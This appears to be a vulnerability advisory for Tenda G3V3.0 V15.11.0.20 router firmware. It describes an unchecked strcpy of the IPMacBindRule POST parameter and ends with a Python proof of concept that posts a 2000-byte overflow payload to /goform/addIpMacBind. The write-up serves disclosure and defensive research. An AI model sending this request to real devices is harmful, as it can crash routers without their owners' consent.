## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3369.html

## Affected version

G3V3.0 V15.11.0.20

## Vulnerability details

The Tenda G3V3.0 V15.11.0.20 firmware has a stack overflow vulnerability in the `formIPMacBindAdd` function. The `rules` variable receives the `IPMacBindRule` parameter from a POST request and is passed to function `ipMacBindListStore` as `listStr`. 

![image-20240417110001592](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417110001592.png)

In function `ipMacBindListStore`, the `listStr` is directly assigned to `inputList`. However, since the user can control the input of `IPMacBindRule`, the statement `strcpy((char *)&inputList, (const char *)listStr);` can cause a buffer overflow. The user-provided  `IPMacBindRule` can exceed the capacity of the `inputList` array, triggering this security vulnerability.

![image-20240417110045932](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417110045932.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addIpMacBind"
payload = b"a"*2000

data = {
        'IPMacBindRule':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```
